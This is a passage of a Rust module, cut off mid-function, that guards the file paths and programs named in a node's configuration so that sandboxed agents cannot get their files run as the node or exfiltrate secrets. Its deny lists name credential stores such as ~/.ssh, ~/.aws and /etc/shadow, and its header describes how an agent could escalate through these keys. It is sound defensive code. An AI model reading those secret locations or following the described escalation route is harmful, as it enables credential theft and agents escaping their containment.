//! Where a `node.toml` key may point when it names a program the node runs on
//! its host, or a file or directory it reads, sends on or writes.
//!
//! Remote configuration makes every key writable by whoever holds an admin
//! session, and an agent can write files: its workspace, its scratch, the
//! state volume its pod shares with the node. A key that could name one of
//! those files as a program would let an agent's bytes run as the node; a
//! key whose file the node reads and sends on (`embed.api_key_file` goes to
//! `embed.base_url` as a bearer token) could carry the node's identity seed
//! or the operator's SSH key to a host the writer chose; a directory the
//! node writes or replaces could be one that something else reads or runs.
//!
//! So each such key is held to rules for what it names
//! (`config_schema::PathKind`). Where a rule can be an allowlist it is one:
//! a secret is read only from a dedicated secrets directory, documents are
//! exported only into the node's own export area or a directory the operator
//! marked for it, and a program is only ever the one its key runs.
//!
//! The rules apply at three points:
//!
//! - **An edit** (`config::edit`) refuses a change that makes any guarded key
//!   break a rule it did not already break. A key that was already wrong is
//!   reported at start, not a reason to refuse an unrelated edit.
//! - **Start** (`serve`) checks the whole file and warns about each key that
//!   breaks a rule. It does not refuse to start: a node that cannot start
//!   cannot be reconfigured remotely either.
//! - **Use**: a program is checked again just before every spawn, and refused
//!   there; the embedding key file before every read (the allowlist of
//!   secret directories aside, so a key file the operator placed by hand
//!   before this guard existed keeps working until it is moved); the export
//!   directory before every export; the UI bundle directory before it is
//!   replaced. A file swapped after the edit that allowed its path is caught
//!   here. What remains is the moment between a check and the `exec` or
//!   `open` that follows it, which only someone who can write the program's
//!   directories (root, or the operator inside a package manager's prefix)
//!   can use.
//!
//! What "an agent can write" means here: the state directory (workspaces,
//! sessions and caches are staged there), the state volume on Kubernetes
//! (`runtime.kubernetes.state_mount`, which harness pods mount), the session
//! worktree root, Podman's container storage (where named volumes and
//! container layers live), and the node's runtime directory. Every path is
//! resolved through its symbolic links first, and each link's own directory
//! counts, so a link cannot launder a path in or out. Places are matched by
//! spelling, by resolved spelling and by the identity of the directory on
//! disk, so `/home` and `/var/home`, `/tmp` and `/private/tmp`, or a
//! different letter case on macOS, are the same place.

use std::collections::BTreeSet;
use std::ffi::{OsStr, OsString};
use std::fmt;
use std::fs::Metadata;
use std::io::Read;
use std::os::unix::ffi::OsStrExt;
use std::os::unix::fs::MetadataExt;
use std::path::{Component, Path, PathBuf};
use std::sync::OnceLock;

use super::{Config, Consulta};
use crate::config_schema::PathKind;

/// Every key the guard checks, with the rules that hold it. A test holds
/// this list to `config_schema::KEYS`.
pub const GUARDED: &[(&str, PathKind)] = &[
    ("boundary.podman", PathKind::Executable),
    ("publish.gh", PathKind::Executable),
    ("publish.glab", PathKind::Executable),
    ("publish.git", PathKind::Executable),
    ("consulta.command", PathKind::Executable),
    ("consulta.args", PathKind::ExecArgs),
    ("runtime.kubernetes.builder.buildctl", PathKind::Executable),
    ("runtime.kubernetes.builder.tls_dir", PathKind::SecretDir),
    (
        "runtime.kubernetes.builder.docker_config",
        PathKind::SecretDir,
    ),
    (
        "runtime.kubernetes.builder.do_token_file",
        PathKind::SecretFile,
    ),
    ("runtime.kubernetes.state_mount", PathKind::Mount),
    ("embed.api_key_file", PathKind::SecretFile),
    ("docs.export_dir", PathKind::WriteDir),
    ("ui.opencode_bundle_dir", PathKind::ManagedDir),
    ("session.worktree_root", PathKind::Root),
    ("external.repo_roots", PathKind::Root),
];

/// The keys whose reader expands a leading `~/` to the operator's home.
const EXPANDS_HOME: &[&str] = &["docs.export_dir", "external.repo_roots"];

/// What each program key may be called, exactly. A key that runs `gh`
/// cannot be pointed at a shell or an interpreter that happens to be
/// installed somewhere trusted: the node would hand it arguments, and run
/// it in a directory, that an agent chose.
fn program_names(key: &str) -> &'static [&'static str] {
    match key {
        "boundary.podman" => &["podman", "podman-remote"],
        "publish.gh" => &["gh"],
        "publish.glab" => &["glab"],
        "publish.git" => &["git"],
        "consulta.command" => &["uv", "consulta"],
        "runtime.kubernetes.builder.buildctl" => &["buildctl"],
        _ => &[],
    }
}

/// The node's own secrets, by name under the state directory: the database,
/// the identity seed every key is derived from, the credential store, the
/// policy signing key.
const NODE_SECRETS: &[&str] = &[
    "node.db",
    "node.db-wal",
    "node.db-shm",
    "node-identity.seed",
    "credentials.sealed",
    "credentials.toml",
    "policy-key",
];

/// Where an operator's own credentials usually live, under their home.
/// Secrets are read only from the dedicated directories below, so this
/// list matters only for a key file placed before that rule existed, which
/// is still read: it is kept out of these. Best effort.
const HOME_CREDENTIAL_STORES: &[&str] = &[
    ".ssh",
    ".gnupg",
    ".aws",
    ".azure",
    ".kube",
    ".docker",
    ".netrc",
    ".git-credentials",
    ".password-store",
    ".claude",
    ".claude.json",
    ".codex",
    ".config/gh",
    ".config/glab-cli",
    ".config/gcloud",
    ".config/claude",
    ".config/opencode",
    ".local/share/opencode",
    "Library/Keychains",
];

const SYSTEM_CREDENTIAL_STORES: &[&str] = &[
    "/etc/shadow",
    "/etc/gshadow",
    "/etc/sudoers",
    "/etc/ssh",
    "/var/run/secrets",
    "/run/secrets/kubernetes.io",
];

/// The only places a secret key may name: a directory set aside for the
/// node's secrets in its configuration directory, and `/etc/tracon`, where
/// a pod mounts its Secrets. Relative to the configuration directory for the
/// first.
const SECRETS_SUBDIR: &str = "secrets";
const ETC_SECRETS: &str = "/etc/tracon";

/// The file that marks a directory as one the operator set aside for
/// exported documents. Only someone on the host can make it: no key can.
pub const EXPORT_MARKER: &str = ".tracon-export";

/// Interfaces to the kernel rather than files: `/proc/self/environ` reads
/// as a regular file and holds the node's environment.
const KERNEL: &[&str] = &["/proc", "/sys", "/dev"];

/// Directories the system owns, which no key may make the node write into
/// or root worktrees under.
const SYSTEM_DIRS: &[&str] = &[
    "/bin",
    "/boot",
    "/dev",
    "/etc",
    "/lib",
    "/lib32",
    "/lib64",
    "/libx32",
    "/proc",
    "/root",
    "/run",
    "/sbin",
    "/sys",
    "/usr",
    "/var/lib",
    "/var/run",
    "/Applications",
    "/Library",
    "/System",
    "/private/etc",
    "/private/var/db",
    "/private/var/run",
];

/// The options `uv run` may take in `consulta.args`. Anything else is
/// refused, because most of what `uv run` accepts chooses what it runs:
/// `--with` a package, `--python` an interpreter, `--index-url` where
/// packages come from, `--directory` where a project is discovered, a
/// script instead of a command.
const UV_RUN_FLAGS: &[&str] = &[
    "--frozen",
    "--locked",
    "--no-sync",
    "--offline",
    "--no-dev",
    "--quiet",
    "-q",
    "--no-progress",
];

/// One key the guard refuses, and why.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Refusal {
    pub key: String,
    /// The value as the file holds it.
    pub value: String,
    pub reason: String,
    /// The value names nothing that exists, somewhere only root or the
    /// node's operator could put it. Not a risk in itself, so neither an
    /// edit nor a start refuses it; a spawn finds nothing to run.
    pub missing: bool,
}

impl fmt::Display for Refusal {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{} = {:?}: {}", self.key, self.value, self.reason)
    }
}

impl std::error::Error for Refusal {}

impl From<Refusal> for std::io::Error {
    fn from(refusal: Refusal) -> Self {
        let kind = match refusal.missing {
            true => std::io::ErrorKind::NotFound,
            false => std::io::ErrorKind::PermissionDenied,
        };
        std::io::Error::new(kind, format!("refused by the path guard: {refusal}"))
    }
}

/// Whether a value is being written (an edit, or the start's report of
/// what an edit would refuse) or used. The two differ only for a secret
/// key: at use, a file outside the dedicated secret directories is still
/// read, so a key file an operator placed before the guard existed keeps
/// working until it is moved.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Stage {
    Edit,
    Use,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct Problem {
    reason: String,
    missing: bool,
}

fn refuse(reason: impl Into<String>) -> Problem {
    Problem {
        reason: reason.into(),
        missing: false,
    }
}

fn missing(reason: impl Into<String>) -> Problem {
    Problem {
        reason: reason.into(),
        missing: true,
    }
}

type FileId = (u64, u64);

fn file_id(meta: &Metadata) -> FileId {
    (meta.dev(), meta.ino())
}

/// A file or directory the rules name, as written, as it resolves, and as
/// the filesystem identifies it, so a path reached through any spelling of
/// it is recognised: `/tmp` and `/private/tmp`, `/home` and `/var/home`,
/// `~/.SSH` on a case-insensitive volume, a hard link.
#[derive(Debug, Clone)]
struct Place {
    label: String,
    origin: Origin,
    lexical: PathBuf,
    /// As the kernel would resolve it, even where it does not exist yet: the
    /// deepest part that exists, resolved, and the rest as written. So the
    /// export area under `/home/<user>` (a link to `/var/home/<user>`) is
    /// recognised before it is made.
    canonical: Option<PathBuf>,
}

/// What made a place one an agent can write, where that matters.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Origin {
    StateDir,
    StateVolume,
    Other,
}

impl Place {
    fn new(label: impl Into<String>, path: PathBuf) -> Self {
        Self::of(label, Origin::Other, path)
    }

    fn of(label: impl Into<String>, origin: Origin, path: PathBuf) -> Self {
        // A relative place is relative to where the node runs, as the node
        // itself would use it; an empty one stays empty and holds nothing.
        let path = match path.is_absolute() || path.as_os_str().is_empty() {
            true => path,
            false => std::path::absolute(&path).unwrap_or(path),
        };
        Self {
            label: label.into(),
            origin,
            canonical: path
                .is_absolute()
                .then(|| walk(&path).ok().map(|walked| walked.resolved))
                .flatten(),
            lexical: path,
        }
    }

    /// Its identity on disk, asked each time: a place made after the guard
    /// was is still recognised.
    fn id(&self) -> Option<FileId> {
        std::fs::metadata(&self.lexical).ok().map(|m| file_id(&m))
    }

    /// `walked` lands in this place, and every link on the way there is
    /// outside every place an agent can write: what an exception for the
    /// node's own areas is decided by. A system or operator link (`/var` to
    /// `/private/var` on macOS, `/home` to `/var/home`) is fine; a link an
    /// agent made is not, so an agent's own path does not come along.
    fn reached_by(&self, walked: &Walked, agent_roots: &[Place]) -> bool {
        self.holds_lexically(&walked.resolved)
            && walked
                .links
                .iter()
                .all(|dir| !agent_roots.iter().any(|root| root.holds(dir)))
    }

    /// `path` is this place or inside it by its spelling alone, as written
    /// or as the place resolves, without asking the filesystem: what an
    /// exception for the node's own areas is decided by, so a link an agent
    /// made into one of them does not bring the agent's path along.
    fn holds_lexically(&self, path: &Path) -> bool {
        self.lexical.is_absolute()
            && (path.starts_with(&self.lexical)
                || self
                    .canonical
                    .as_deref()
                    .is_some_and(|c| path.starts_with(c)))
    }

    /// `path` is this place or inside it. A place that is not an absolute
    /// path holds nothing: every path starts with the empty one.
    fn holds(&self, path: &Path) -> bool {
        if !self.lexical.is_absolute() {
            return false;
        }
        if path.starts_with(&self.lexical)
            || self
                .canonical
                .as_deref()
                .is_some_and(|c| path.starts_with(c))
        {
            return true;
        }
        let Some(id) = self.id() else {
            return false;
        };
        path.ancestors().any(|at| {
            std::fs::metadata(at)
                .ok()
                .is_some_and(|m| file_id(&m) == id)
        })
    }

    /// This place is `path` or inside it.
    fn within(&self, path: &Path) -> bool {
        if !self.lexical.is_absolute() {
            return false;
        }
        if self.lexical.starts_with(path)
            || self
                .canonical
                .as_deref()
                .is_some_and(|c| c.starts_with(path))
        {
            return true;
        }
        let Some(target) = std::fs::metadata(path).ok().map(|m| file_id(&m)) else {
            return false;
        };
        let start = self.canonical.as_deref().unwrap_or(&self.lexical);
        start.ancestors().any(|at| {
            std::fs::metadata(at)
                .ok()
                .is_some_and(|m| file_id(&m) == target)
        })
    }

    /// `path` is this place itself.
    fn is(&self, path: &Path) -> bool {
        self.lexical.is_absolute()
            && (path == self.lexical
                || self.canonical.as_deref() == Some(path)
                || self.id().is_some_and(|id| {
                    std::fs::metadata(path).ok().map(|m| file_id(&m)) == Some(id)
                }))
    }

    fn shown(&self) -> String {
        format!("{} ({})", self.label, self.lexical.display())
    }
}

/// Where this node keeps things, and what it trusts, independent of any one
/// `node.toml`.
#[derive(Debug, Clone)]
pub struct Layout {
    pub state_dir: PathBuf,
    pub config_dir: PathBuf,
    /// The node's own data area: `<data dir>/tracon`, where documents are
    /// exported unless the operator marked another directory.
    pub data_dir: PathBuf,
    /// The operator's home, as `HOME` gives it and as the password database
    /// does, when they differ.
    pub homes: Vec<PathBuf>,
    /// The `PATH` a bare program name is looked up on.
    pub path_var: Option<OsString>,
    /// The volume the state directory lives on, when that volume is one
    /// harness pods mount (on Kubernetes): found from the running process,
    /// not from `node.toml`, so no edit can move it.
    pub state_volume: Option<PathBuf>,
    /// Places an agent can write besides those `node.toml` names.
    pub agent_roots: Vec<(String, PathBuf)>,
    /// Package managers' prefixes, where an operator's tools are installed
    /// and owned by the operator's own user (Homebrew on macOS and Linux,
    /// `~/.local/bin`, `~/.cargo/bin`). A program there may be owned and
    /// writable by the node's user; anywhere else it may not.
    pub trusted_prefixes: Vec<PathBuf>,
}

impl Layout {
    pub fn of_this_process() -> Self {
        let mut homes: Vec<PathBuf> = std::env::var_os("HOME")
            .map(PathBuf::from)
            .filter(|home| home.is_absolute())
            .into_iter()
            .collect();
        if let Some(home) = passwd_home().filter(|home| !homes.contains(home)) {
            homes.push(home);
        }
        let mut agent_roots = vec![(
            "the node's runtime directory".to_string(),
            Config::runtime_dir(),
        )];
        // Rootless Podman keeps named volumes and container layers under
        // the data directory, rootful under /var/lib; both are written by
        // whatever runs in a container.
        if let Some(data) = dirs::data_dir() {
            agent_roots.push(("Podman's container storage".into(), data.join("containers")));
        }
        if cfg!(target_os = "linux") {
            agent_roots.push((
                "Podman's container storage".into(),
                PathBuf::from("/var/lib/containers"),
            ));
            if let Some(runtime) = dirs::runtime_dir() {
                agent_roots.push((
                    "Podman's runtime storage".into(),
                    runtime.join("containers"),
                ));
            }
        }
        let mut trusted_prefixes = vec![
            PathBuf::from("/opt/homebrew"),
            PathBuf::from("/usr/local"),
            PathBuf::from("/home/linuxbrew/.linuxbrew"),
        ];
        if let Some(home) = homes.first() {
            trusted_prefixes.push(home.join(".local/bin"));
            trusted_prefixes.push(home.join(".cargo/bin"));
        }
        let config_path = Config::config_path();
        let state_dir = Config::state_dir();
        // In a pod, the state directory is on the claim every harness pod
        // mounts a part of. Which part is not the guard's to know, so all
        // of it counts.
        let state_dir = absolute(state_dir);
        let state_volume =
            std::env::var_os("KUBERNETES_SERVICE_HOST").and_then(|_| claim(&state_dir, &homes));
        Self {
            state_volume,
            data_dir: absolute(
                dirs::data_dir()
                    .map(|data| data.join("tracon"))
                    .unwrap_or_else(|| state_dir.join("data")),
            ),
            state_dir,
            config_dir: absolute(
                config_path
                    .parent()
                    .map(Path::to_path_buf)
                    .unwrap_or(config_path),
            ),
            homes,
            path_var: std::env::var_os("PATH"),
            agent_roots,
            trusted_prefixes,
        }
    }
}

/// The top of the filesystem `path` is on: its highest ancestor on the same
/// device. A path that does not exist yet (a first start) is judged by its
/// nearest ancestor that does.
fn mount_root(path: &Path) -> Option<PathBuf> {
    let existing = path.ancestors().find(|at| at.exists())?;
    let path = std::fs::canonicalize(existing).ok()?;
    let device = std::fs::metadata(&path).ok()?.dev();
    path.ancestors()
        .take_while(|at| std::fs::metadata(at).is_ok_and(|m| m.dev() == device))
        .last()
        .map(Path::to_path_buf)
}

/// `path` made absolute against the working directory, as the node itself
/// would use a relative `TRACON_STATE_DIR`.
fn absolute(path: PathBuf) -> PathBuf {
    match path.is_absolute() {
        true => path,
        false => std::path::absolute(&path).unwrap_or(path),
    }
}

/// The claim a pod's state directory is on: the top of its filesystem,
/// never `/` and never a home directory, which would make everything an
/// agent place and so nothing worth saying.
fn claim(state_dir: &Path, homes: &[PathBuf]) -> Option<PathBuf> {
    let root = mount_root(state_dir)?;
    let is_home = homes
        .iter()
        .any(|home| *home == root || std::fs::canonicalize(home).is_ok_and(|home| home == root));
    (root.parent().is_some() && !is_home).then_some(root)
}

/// The home directory the password database gives this process's user.
fn passwd_home() -> Option<PathBuf> {
    let mut buffer = vec![0u8; 16 * 1024];
    // SAFETY: an all-zero `passwd` is a valid value to be overwritten.
    let mut entry: libc::passwd = unsafe { std::mem::zeroed() };
    let mut found: *mut libc::passwd = std::ptr::null_mut();
    // SAFETY: every pointer is to a live, correctly sized local; the
    // strings `entry` points at live in `buffer`, read before it drops.
    let status = unsafe {
        libc::getpwuid_r(
            libc::geteuid(),
            &mut entry,
            buffer.as_mut_ptr().cast(),
            buffer.len(),
            &mut found,
        )
    };
    if status != 0 || found.is_null() || entry.pw_dir.is_null() {
        return None;
    }
    // SAFETY: getpwuid_r succeeded, so pw_dir is a NUL-terminated string
    // inside `buffer`.
    let dir = unsafe { std::ffi::CStr::from_ptr(entry.pw_dir) };
    let dir = PathBuf::from(OsStr::from_bytes(dir.to_bytes()));
    dir.is_absolute().then_some(dir)
}

/// The rules, for one node: its layout, and the places one or more
/// `node.toml` versions name.
#[derive(Debug, Clone)]
pub struct Guard {
    off: bool,
    euid: u32,
    egid: u32,
    state: Place,
    config: Place,
    data: Place,
    exports: Place,
    homes: Vec<Place>,
    agent_roots: Vec<Place>,
    worktree_roots: Vec<Place>,
    trusted: Vec<Place>,
    secret_dirs: Vec<Place>,
    secrets: Vec<Place>,
    credential_stores: Vec<Place>,
    path_var: Option<OsString>,
}

impl Guard {
    pub fn new(layout: Layout, configs: &[&Config]) -> Self {
        let mut agent_roots = vec![Place::of(
            "the state directory",
            Origin::StateDir,
            layout.state_dir.clone(),
        )];
        // Only a pod's claim, by the file as well as the environment.
        let pod = configs
            .iter()
            .any(|cfg| cfg.runtime.kind == super::RuntimeKind::Kubernetes);
        if let Some(volume) = layout.state_volume.as_ref().filter(|_| pod) {
            agent_roots.push(Place::of(
                "the state volume",
                Origin::StateVolume,
                volume.clone(),
            ));
        }
        for (label, path) in &layout.agent_roots {
            agent_roots.push(Place::new(label.clone(), path.clone()));
        }
        let mut worktree_roots = Vec::new();
        for cfg in configs {
            let mount = &cfg.runtime.kubernetes.state_mount;
            if mount.is_absolute() {
                agent_roots.push(Place::of(
                    "the state volume",
                    Origin::StateVolume,
                    mount.clone(),
                ));
            }
            let root = &cfg.session.worktree_root;
            if root.is_absolute() {
                let place = Place::new("the session worktree root", root.clone());
                agent_roots.push(place.clone());
                worktree_roots.push(place);
            }
        }
        let mut credential_stores: Vec<Place> = SYSTEM_CREDENTIAL_STORES
            .iter()
            .map(|path| Place::new("a credential store", PathBuf::from(path)))
            .collect();
        for home in &layout.homes {
            credential_stores.extend(
                HOME_CREDENTIAL_STORES
                    .iter()
                    .map(|rel| Place::new("the operator's credentials", home.join(rel))),
            );
        }
        Self {
            off: false,
            // SAFETY: geteuid has no preconditions and cannot fail.
            euid: unsafe { libc::geteuid() },
            // SAFETY: as geteuid.
            egid: unsafe { libc::getegid() },
            secrets: NODE_SECRETS
                .iter()
                .map(|name| Place::new(*name, layout.state_dir.join(name)))
                .collect(),
            secret_dirs: vec![
                Place::new(
                    "the node's secrets directory",
                    layout.config_dir.join(SECRETS_SUBDIR),
                ),
                Place::new("the node's secrets directory", PathBuf::from(ETC_SECRETS)),
            ],
            state: Place::new("the state directory", layout.state_dir),
            config: Place::new("the configuration directory", layout.config_dir),
            exports: Place::new(
                "the node's export directory",
                layout.data_dir.join("exports"),
            ),
            data: Place::new("the node's data directory", layout.data_dir),
            homes: layout
                .homes
                .into_iter()
                .map(|home| Place::new("the home directory", home))
                .collect(),
            agent_roots,
            worktree_roots,
            trusted: layout
                .trusted_prefixes
                .into_iter()
                .map(|prefix| Place::new("a package manager's prefix", prefix))
                .collect(),
            credential_stores,
            path_var: layout.path_var,
        }
    }

    /// The guard for this process, from the `node.toml` it would load.
    pub fn for_this_node() -> Self {
        let cfg = quiet_load();
        Self::new(Layout::of_this_process(), &[&cfg])
    }

    /// Checks nothing. Only a test build has it: an integration test's
    /// stand-in programs live in a temporary directory.
    #[cfg(any(test, feature = "test-support"))]
    pub fn unchecked() -> Self {
        Self {
            off: true,
            ..Self::new(
                Layout {
                    state_dir: PathBuf::new(),
                    config_dir: PathBuf::new(),
                    data_dir: PathBuf::new(),
                    state_volume: None,
                    homes: Vec::new(),
                    path_var: None,
                    agent_roots: Vec::new(),
                    trusted_prefixes: Vec::new(),
                },
                &[],
            )
        }
    }

    /// Every guarded key in `cfg` that an edit could not write.
    pub fn check(&self, cfg: &Config) -> Vec<Refusal> {
        values(cfg)
            .into_iter()
            .filter_map(|(key, value)| self.check_entry(cfg, key, &value).err())
            .collect()
    }

    fn check_entry(&self, cfg: &Config, key: &'static str, value: &str) -> Result<(), Refusal> {
        match kind_of(key) {
            Some(PathKind::Executable) if key == "boundary.podman" => {
                let candidates = crate::boundary::podman::podman_candidates();
                let refs: Vec<&Path> = candidates.iter().map(PathBuf::as_path).collect();
                self.program_with(key, value, &refs).map(drop)
            }
            Some(PathKind::Executable) => self.program(key, value).map(drop),
            Some(PathKind::ExecArgs) => self.consulta_args(&cfg.consulta),
            Some(_) => self.path(key, value, Stage::Edit),
            None => Ok(()),
        }
    }

    /// The program to spawn for `key`: `value` resolved (a bare name on
    /// `PATH`) and checked. What it returns is the path to run, absolute and
    /// as found rather than with its links resolved, so a program that finds
    /// its own files beside its link still does.
    pub fn program(&self, key: &str, value: &str) -> Result<PathBuf, Refusal> {
        self.program_with(key, value, &[])
    }

    /// As `program`, with places to look for a bare name after `PATH`. An
    /// empty value means the key's own program name.
    pub fn program_with(
        &self,
        key: &str,
        value: &str,
        fallbacks: &[&Path],
    ) -> Result<PathBuf, Refusal> {
        let names = program_names(key);
        let wanted = match (value.is_empty(), names.first()) {
            (true, Some(name)) => *name,
            _ => value,
        };
        if self.off {
            return Ok(PathBuf::from(wanted));
        }
        let refused = |problem: Problem| Refusal {
            key: key.to_string(),
            value: value.to_string(),
            reason: problem.reason,
            missing: problem.missing,
        };
        if wanted.is_empty() {
            return Err(refused(refuse("is empty")));
        }
        if wanted.contains('\0') {
            return Err(refused(refuse("contains a NUL byte")));
        }
        let name = Path::new(wanted)
            .file_name()
            .unwrap_or_else(|| OsStr::new(""));
        if !names.is_empty() && !names.iter().any(|n| OsStr::new(n) == name) {
            return Err(refused(refuse(format!(
                "names a program called {:?}, and this key runs {}",
                name,
                names.join(" or ")
            ))));
        }
        if wanted.contains('/') {
            let path = Path::new(wanted);
            plain_absolute(path).map_err(refused)?;
            return self
                .executable_at(path)
                .map(|()| path.to_path_buf())
                .map_err(refused);
        }
        let mut skipped = Vec::new();
        let candidates = self
            .path_entries()
            .into_iter()
            .map(|dir| dir.join(wanted))
            .chain(fallbacks.iter().map(|path| path.to_path_buf()));
        for candidate in candidates {
            // A relative entry is relative to wherever the node was started.
            if !candidate.is_absolute() || std::fs::symlink_metadata(&candidate).is_err() {
                continue;
            }
            match self.executable_at(&candidate) {
                Ok(()) => return Ok(candidate),
                Err(problem) => {
                    skipped.push(format!("{} ({})", candidate.display(), problem.reason))
                }
            }
        }
        Err(refused(match skipped.is_empty() {
            true => missing(format!("{wanted} is not on the node's PATH")),
            false => refuse(format!(
                "{wanted} is on the node's PATH only where the guard refuses it: {}",
                skipped.join("; ")
            )),
        }))
    }

    fn path_entries(&self) -> Vec<PathBuf> {
        self.path_var
            .as_deref()
            .map(|path| std::env::split_paths(path).collect())
            .unwrap_or_default()
    }

    /// The node's `PATH` less every entry a program could not be run from:
    /// empty or relative ones, and ones inside a place an agent can write or
    /// writable by anyone the guard does not trust. What every guarded
    /// program is given as its own `PATH`, so a program that runs another
    /// (git its helpers, uv its tools) does not find a planted one.
    pub fn child_path(&self) -> OsString {
        if self.off {
            return std::env::var_os("PATH").unwrap_or_default();
        }
        let kept: Vec<PathBuf> = self
            .path_entries()
            .into_iter()
            .filter(|dir| self.program_dir(dir).is_ok())
            .collect();
        std::env::join_paths(kept).unwrap_or_default()
    }

    /// A directory programs may be run from, as a `PATH` entry.
    fn program_dir(&self, dir: &Path) -> Result<(), Problem> {
        if !dir.is_absolute() {
            return Err(refuse("is not absolute"));
        }
        let walked = walk(dir)?;
        if !walked.exists {
            return Err(missing("does not exist"));
        }
        self.outside_agent_roots(dir, &walked)?;
        let writers = match self.is_trusted(dir) || self.is_trusted(&walked.resolved) {
            true => Writers::Foreign,
            false => Writers::AnyButRoot,
        };
        self.chains(&walked, writers)
    }

    /// The `consulta` program, with its arguments held to the shape the
    /// node runs it in.
    pub fn consulta(&self, consulta: &Consulta) -> Result<PathBuf, Refusal> {
        let program = self.program("consulta.command", &consulta.command);
        // A refused command is the reason; one not installed yet still has
        // its arguments checked.
        if self.off || program.as_ref().is_err_and(|refusal| !refusal.missing) {
            return program;
        }
        self.consulta_args(consulta)?;
        program
    }

    /// The arguments alone, by the program the command names, whether or
    /// not that program is installed yet. The node appends the query's own
    /// arguments after these; nothing here may add more, since consulta's
    /// own options include where it writes its output.
    fn consulta_args(&self, consulta: &Consulta) -> Result<(), Refusal> {
        let refused = |problem: Problem| Refusal {
            key: "consulta.args".into(),
            value: consulta.args.join(" "),
            reason: problem.reason,
            missing: problem.missing,
        };
        let name = Path::new(&consulta.command)
            .file_name()
            .unwrap_or_else(|| OsStr::new(""));
        if name == "uv" {
            return self.uv_run(&consulta.args).map_err(refused);
        }
        match consulta.args.first() {
            None => Ok(()),
            Some(arg) => Err(refused(refuse(format!(
                "passes {arg:?} to consulta; when the command is consulta itself it takes no arguments here"
            )))),
        }
    }

    /// `uv run [options] [--project <consulta>] consulta`, and nothing else
    /// uv can be asked to run or consulta asked to do.
    fn uv_run(&self, args: &[String]) -> Result<(), Problem> {
        let mut args = args.iter();
        if args.next().map(String::as_str) != Some("run") {
            return Err(refuse(
                "must start with `run`: the node runs consulta through `uv run`",
            ));
        }
        let mut program = false;
        while let Some(arg) = args.next() {
            if program {
                return Err(refuse(format!(
                    "passes {arg:?} to consulta after it; nothing may follow `consulta` here, since the node supplies consulta's arguments itself"
                )));
            }
            if let Some(project) = arg.strip_prefix("--project=") {
                self.consulta_project(project)?;
                continue;
            }
            if arg == "--project" {
                let project = args
                    .next()
                    .ok_or_else(|| refuse("`--project` needs a directory after it"))?;
                self.consulta_project(project)?;
                continue;
            }
            if UV_RUN_FLAGS.contains(&arg.as_str()) {
                continue;
            }
            if arg.starts_with('-') {
                return Err(refuse(format!(
                    "`uv run {arg}` could choose what runs; the options allowed here are --project and {}",
                    UV_RUN_FLAGS.join(", ")
                )));
            }
            if arg != "consulta" {
                return Err(refuse(format!(
                    "runs {arg:?} through uv; only consulta runs here"
                )));
            }
            program = true;
        }
        if !program {
            return Err(refuse(
                "names no program for `uv run`; it should end in consulta",
            ));
        }
        Ok(())
    }

    /// The project `uv run` runs consulta from: what it holds decides what
    /// runs, so it must be consulta's own, kept out of an agent's reach and
    /// owned as a secret is (the node's own user may write it: the image's
    /// `/opt/consulta` is the node's, for uv's own bookkeeping).
    fn consulta_project(&self, value: &str) -> Result<(), Problem> {
        let path = Path::new(value);
        plain_absolute(path)?;
        let walked = walk(path)?;
        if [path, walked.resolved.as_path()]
            .iter()
            .any(|p| p.parent().is_none())
        {
            return Err(refuse("is the root directory"));
        }
        self.outside_agent_roots(path, &walked)?;
        self.not_a_node_secret(path, &walked)?;
        outside(KERNEL, path, &walked, "a kernel interface")?;
        outside(SYSTEM_DIRS, path, &walked, "a system directory")?;
        self.chains(&walked, Writers::Foreign)?;
        if !walked.exists {
            return Err(missing(format!("{} does not exist", path.display())));
        }
        let manifest = walked.resolved.join("pyproject.toml");
        let meta = std::fs::symlink_metadata(&manifest)
            .map_err(|_| refuse("holds no pyproject.toml, so it is not consulta's project"))?;
        if !meta.file_type().is_file() {
            return Err(refuse("its pyproject.toml is not a regular file"));
        }
        self.component(&manifest, &meta, Writers::Foreign)?;
        let text = std::fs::read_to_string(&manifest)
            .map_err(|e| refuse(format!("{}: {e}", manifest.display())))?;
        let name = text
            .parse::<toml::Table>()
            .ok()
            .and_then(|t| t.get("project")?.get("name")?.as_str().map(String::from));
        match name.as_deref() {
            Some("consulta") => Ok(()),
            other => Err(refuse(format!("is the project {other:?}, not consulta's"))),
        }
    }

    /// A non-program key's value, by its kind.
    pub fn path(&self, key: &str, value: &str, stage: Stage) -> Result<(), Refusal> {
        self.checked(key, value, stage).map(drop)
    }

    /// As `path`, with the path the node uses for the value (`~/`
    /// expanded) and the identity of what it named when it was checked, so
    /// a caller that opens it afterwards can tell whether it opened that.
    fn checked(
        &self,
        key: &str,
        value: &str,
        stage: Stage,
    ) -> Result<(PathBuf, Option<FileId>), Refusal> {
        if self.off {
            return Ok((PathBuf::from(value), None));
        }
        let Some(kind) = kind_of(key) else {
            return Ok((PathBuf::from(value), None));
        };
        let refused = |problem: Problem| Refusal {
            key: key.to_string(),
            value: value.to_string(),
            reason: problem.reason,
            missing: problem.missing,
        };
        let path = match EXPANDS_HOME.contains(&key) {
            true => self.expand_home(value).map_err(refused)?,
            false => PathBuf::from(value),
        };
        let walked = match kind {
            PathKind::SecretFile | PathKind::SecretDir => self.secret(&path, kind, stage),
            PathKind::WriteDir | PathKind::ManagedDir | PathKind::Root => {
                self.directory(&path, kind)
            }
            PathKind::Mount => self.mount(&path),
            PathKind::Executable | PathKind::ExecArgs => return Ok((path, None)),
        }
        .map_err(refused)?;
        Ok((path, walked.id))
    }

    fn expand_home(&self, value: &str) -> Result<PathBuf, Problem> {
        let path = Path::new(value);
        match (path.strip_prefix("~"), self.homes.first()) {
            (Ok(rest), Some(home)) => Ok(home.lexical.join(rest)),
            (Ok(_), None) => Err(refuse("starts with ~, and the node has no home directory")),
            (Err(_), _) => Ok(path.to_path_buf()),
        }
    }

    fn secret(&self, path: &Path, kind: PathKind, stage: Stage) -> Result<Walked, Problem> {
        plain_absolute(path)?;
        let walked = walk(path)?;
        self.not_a_node_secret(path, &walked)?;
        // The configuration directory's secrets are the node's own even
        // where that directory sits in the state directory (macOS) or on
        // the state volume (Kubernetes, `/state/config`): nothing an agent
        // sends is staged there, and a harness pod mounts only the claim's
        // top-level `tracon-*` volumes.
        // Decided by spelling alone, written and resolved: a link an agent
        // made into the secrets directory does not make its own path one.
        let in_config_secrets = self.secret_dirs[0].reached_by(&walked, &self.agent_roots);
